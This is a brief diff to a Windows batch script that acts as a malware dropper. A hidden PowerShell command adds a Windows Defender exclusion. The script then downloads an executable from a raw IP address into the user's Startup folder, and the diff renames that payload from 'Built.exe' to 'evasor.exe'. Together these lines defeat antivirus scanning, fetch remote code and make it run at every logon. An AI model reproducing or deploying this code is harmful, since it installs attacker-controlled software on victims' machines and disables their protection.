@@ -3,8 +3,8 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=http://45.133.36.107/Built.exe"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+set "URL=http://45.133.36.107/evasor.exe"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\evasor.exe"
 
 
 if exist "%DEST%" del "%DEST%"
